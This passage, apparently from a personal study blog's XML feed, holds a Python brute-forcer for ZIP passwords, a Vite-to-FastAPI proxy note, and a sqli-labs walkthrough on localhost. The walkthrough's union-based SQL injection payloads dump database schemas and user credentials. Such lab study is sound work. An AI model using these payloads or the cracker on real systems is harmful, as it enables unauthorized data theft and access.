class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">lock=threading.Lock()</span><br><span class="line">os.chdir(<span class="string">r&#x27;./zip&#x27;</span>)</span><br><span class="line">sum__=<span class="number">0</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_zipfile</span>():</span><br><span class="line">    files = os.listdir()</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> file</span><br><span class="line">file = get_zipfile()</span><br><span class="line">zfile = zipfile.ZipFile(file) </span><br><span class="line"></span><br><span class="line">base=  <span class="string">&#x27;0123456789&#x27;</span><span class="comment">#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz~!@#|$%^&amp;*(,)&gt;./`&lt;_+&#125;-=&#123;[\]?:&quot;;&#x27;+&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">l=<span class="built_in">len</span>(base)</span><br><span class="line"></span><br><span class="line">R=<span class="number">12</span><span class="comment">#创建R个线程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bao</span>(<span class="params">si,ei,LEN</span>):</span><br><span class="line">    <span class="keyword">global</span> sum__</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(si)+<span class="string">&#x27;--&#x27;</span>+<span class="built_in">str</span>(ei))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(si, ei): </span><br><span class="line">        s=<span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">while</span>(n!=<span class="number">0</span>):</span><br><span class="line">            a=n%l</span><br><span class="line">            s.append(base[a])</span><br><span class="line">            n=(n-a)//l</span><br><span class="line">        pwd= <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,s)).ljust(LEN,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#sum__-=1</span></span><br><span class="line">        <span class="comment">#print(pwd)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zfile.extractall(path=<span class="string">&#x27;./rst&#x27;</span>, pwd=pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;解压密码是：%s\n&#x27;</span>%pwd)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(pwd)</span><br><span class="line">            os._exit(<span class="number">0</span>) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">T=<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">len_</span>):</span><br><span class="line">    <span class="keyword">global</span> sum__</span><br><span class="line">    sum__+=l**len_</span><br><span class="line">    N=(l**len_)//R+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(N)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(R):</span><br><span class="line">        n=i*N</span><br><span class="line">        t1=Process(target=bao,args=(n,n+N,len_))</span><br><span class="line">        T.append(t1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> T:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> T:</span><br><span class="line">        i.join()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proc</span>():</span><br><span class="line">    P=<span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">7</span>):</span><br><span class="line">        p1=Process(target=run,args=(i,))</span><br><span class="line">        P.append(p1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> P:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line">proc()</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><details><summary><font color='greenyellow'>win(展开)</font></summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">lock=threading.Lock()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">r&#x27;./zip&#x27;</span>):</span><br><span class="line">    os.chdir(<span class="string">r&#x27;.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    os.chdir(<span class="string">r&#x27;./zip&#x27;</span>)</span><br><span class="line">sum__=<span class="number">0</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,freeze_support</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_zipfile</span>():</span><br><span class="line">    files = os.listdir()</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> file</span><br><span class="line">file = get_zipfile()</span><br><span class="line">zfile = zipfile.ZipFile(file) </span><br><span class="line"></span><br><span class="line">base=  <span class="string">&#x27;0123456789&#x27;</span><span class="comment">#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz~!@#|$%^&amp;*(,)&gt;./`&lt;_+&#125;-=&#123;[\]?:&quot;;&#x27;+&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">l=<span class="built_in">len</span>(base)</span><br><span class="line"></span><br><span class="line">R=<span class="number">12</span><span class="comment">#创建R个线程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bao</span>(<span class="params">si,ei,LEN</span>):</span><br><span class="line">    <span class="keyword">global</span> sum__</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(si)+<span class="string">&#x27;--&#x27;</span>+<span class="built_in">str</span>(ei))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(si, ei): </span><br><span class="line">        s=<span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">while</span>(n!=<span class="number">0</span>):</span><br><span class="line">            a=n%l</span><br><span class="line">            s.append(base[a])</span><br><span class="line">            n=(n-a)//l</span><br><span class="line">        pwd= <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,s)).ljust(LEN,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#sum__-=1</span></span><br><span class="line">        <span class="built_in">print</span>(pwd)</span><br><span class="line">        <span class="comment">#print (os.path.abspath(os.curdir))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            zfile.extractall(path=<span class="string">&#x27;./rst&#x27;</span>, pwd=pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;解压密码是：%s\n&#x27;</span>%pwd)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(pwd)</span><br><span class="line">            os._exit(<span class="number">0</span>) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">T=<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">len_</span>):</span><br><span class="line">    <span class="keyword">global</span> sum__</span><br><span class="line">    sum__+=l**len_</span><br><span class="line">    N=(l**len_)//R+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(N)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(R):</span><br><span class="line">        n=i*N</span><br><span class="line">        t1=Process(target=bao,args=(n,n+N,len_))</span><br><span class="line">        T.append(t1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> T:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> T:</span><br><span class="line">        i.join()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    P=<span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">7</span>):</span><br><span class="line">        p1=Process(target=run,args=(i,))</span><br><span class="line">        P.append(p1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> P:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>powershell 下用python 运行</p></details>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> zip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue通过vite代理连接fastapi，从而解决没有Access-Control-Allow-Origin跨域问题</title>
      <link href="/2024/10/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vue/vue%E9%80%9A%E8%BF%87vite%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5fastapi%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89Access-Control-Allow-Origin%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/"/>
      <url>/2024/10/26/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vue/vue%E9%80%9A%E8%BF%87vite%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5fastapi%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89Access-Control-Allow-Origin%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>啊<br> <span id="more"></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getMessage() &#123;</span><br><span class="line">        axios.get(&quot;/api/后端路由&quot;).then((res) =&gt; &#123;</span><br><span class="line">          this.msg = res.data;        </span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>vite.config.js&#x2F;ts下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">export default defineConfig(&#123;</span><br><span class="line">server:&#123;</span><br><span class="line">   host: &#x27;0.0.0.0&#x27;,</span><br><span class="line">   proxy:&#123;</span><br><span class="line">    &#x27;/api&#x27;:&#123;</span><br><span class="line">      target: &#x27;http://127.0.0.1:8001&#x27;,</span><br><span class="line">      changeOrigin:true,</span><br><span class="line">      rewrite:(path) =&gt; path.replace(/^\/api/, &#x27;&#x27;)</span><br><span class="line">    &#125;,</span><br><span class="line">   &#125;</span><br><span class="line">&#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    vue(),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>post出错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#fastapi</span><br><span class="line">INFO:     127.0.0.1:60712 - &quot;POST /login HTTP/1.1&quot; 307 Temporary Redirect</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浏览器：</span><br><span class="line">已拦截跨源请求：同源策略禁止读取位于 http://127.0.0.1:8001/login/ 的远程资源。</span><br><span class="line">（原因：CORS 请求未能成功）。状态码：(null)</span><br></pre></td></tr></table></figure><p>原来后端路由是 &#x2F;login&#x2F;<br>用axios在main.js 中添加axios.defaults.baseURL &#x3D; &#39;<a href="http://192.168.86.137:8001/'%E7%9A%84%E6%96%B9%E6%B3%95">http://192.168.86.137:8001/&#39;的方法</a><br>axios.post(&#39;&#x2F;login&#39;...能请求成功<br>现在后面要加&#x2F;才行<br>axios.post(&#39;&#x2F;api&#x2F;login&#x2F;&#39;</p>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-less-1,4,11</title>
      <link href="/2024/10/14/%E5%AD%A6/sqli-labs/sqli-labs-less_1,4,11/"/>
      <url>/2024/10/14/%E5%AD%A6/sqli-labs/sqli-labs-less_1,4,11/</url>
      
        <content type="html"><![CDATA[<p>这样会加载得更快吗<br> <span id="more"></span></p><ul><li><a href="#1"><font size=5>1.less1</font></a><ul><li><a href="#1.3"><font size=4>表名</font></a></li><li><a href="#1.4"><font size=4>库名</font></a></li><li><a href="#1.5"><font size=4>列名</font></a></li></ul></li><li><a href="#4"><font size=5>4.less4</font></a><ul><li><a href="#4.1"><font size=4>测</font></a></li><li><a href="#4.2"><font size=4>猜</font></a></li><li><a href="#4.3"><font size=4>注</font></a></li></ul></li><li><a href="#11"><font size=5>11.less11</font></a><ul><li><a href="#11.1"><font size=4>表名</font></a></li><li><a href="#11.2"><font size=4>库名</font></a></li><li><a href="#11.3"><font size=4>列名</font></a></li></ul></li></ul><details><summary><font color='yellowgreen'>安装(展开)</font></summary><ul><li><p>安装phpstudy </p></li><li><p>下载php5.4.z </p></li><li><p>打开localhost根目录并放入sqli-labs文件<br>-&#x2F;sqli-labs&#x2F;sql-connections&#x2F;db-creds.inc 修改mysql用户和密码<br><img src="/images/%E5%AD%A6/sqli-labs/sqli-labs-less_1,4,11.png" alt="试试图片" loading="lazy"></p></li><li><p>打开网站<a href="http://localhost/sqli-labs/sql-connections/setup-db.php">http://localhost/sqli-labs/sql-connections/setup-db.php</a></p></li></ul></details><h2 id="1">1.less1</h2>##### 看回显位置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 ;--+</span><br></pre></td></tr></table></figure><font color='green'>Your Login name:2</br>Your Password:3</font><h5 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3 ;--+</span><br></pre></td></tr></table></figure><font color='green'>Your Login name: **security**</br>Your Password:3</font><h3 id="1.3">表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database();--+</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat(table_name,<span class="string">&#x27;-&#x27;</span>,table_schema)),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables;<span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,table_schema),2 from information_schema.tables;--+</span></span><br></pre></td></tr></table></figure><p>emails,referers,uagents,users</p><h3 id="1.4">库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name),2 from information_schema.schemata;--+</span></span><br></pre></td></tr></table></figure><h3 id="1.5">列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database();--+</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,username,&#x27;</span><span class="operator">-</span><span class="string">&#x27;,password),2 from users ;--+</span></span><br></pre></td></tr></table></figure><hr><hr><h2 id="4">4.less4</h2><h3 id="4.1">1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure><p>You have an error in your ... right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</p><h3 id="4.2">2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;&#x27;);--+</span><br></pre></td></tr></table></figure><p>syntax to use near &#39;&#39;);-- &quot;) LIMIT 0,1&#39; at line 1<br>判断网站帮我加了一个 &#39;</p><h3 id="4.3">3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) union select 1,2,3  ;--+</span><br></pre></td></tr></table></figure><h2 id="同less1"><a href="#同less1" class="headerlink" title="同less1"></a>同less1</h2><hr><h2 id="11">11.less11</h2><h3 id="11.1">尝试</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  返回admin</span><br><span class="line">admin<span class="string">&#x27; and 1# 返回admin</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>#返回第一个</span><br></pre></td></tr></table></figure><h3 id="11.2">库名表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,database();#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>db</title>
      <link href="/2024/10/13/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/dabian/"/>
      <url>/2024/10/13/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/dabian/</url>
      
        <content type="html"><![CDATA[<p>1<br> <span id="more"></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install zsh zsh-syntax-highlighting zsh-autosuggestions <span class="comment">#open-vm-tools-desktop</span></span><br><span class="line">vmware-user</span><br></pre></td></tr></table></figure><p>~&#x2F;.zshrc kali复制的文件</p><details><summary>展开查看</summary><pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span 